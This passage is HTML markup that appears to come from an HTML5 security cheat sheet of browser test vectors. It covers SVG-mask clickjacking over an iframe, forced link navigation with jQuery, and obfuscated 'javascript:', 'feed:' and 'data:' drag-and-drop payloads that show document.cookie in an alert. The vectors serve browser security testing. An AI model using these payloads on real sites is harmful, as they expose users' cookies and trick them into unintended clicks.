style="background:gray"> <iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/> <svg:svg> <svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox"> <svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/> <svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/> </svg:mask> </svg:svg> </body> </html><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe><span class=foo>Some text</span> <a class=bar href="http://www.example.org">www.example.org</a> <script src="http://code.jquery.com/jquery-1.4.4.js"></script> <script> $("span.foo").click(function() { alert('foo'); $("a.bar").click(); }); $("a.bar").click(function() { alert('bar'); location="http://html5sec.org"; }); </script><b>drag and drop one of the following strings to the drop box:</b> <br/><hr/> jAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);// <br/><hr/> feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);// <br/><hr/> feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b> <br/><hr/> feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);// <br/><hr/> <div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventDefault()">+ Drop Box +</div>
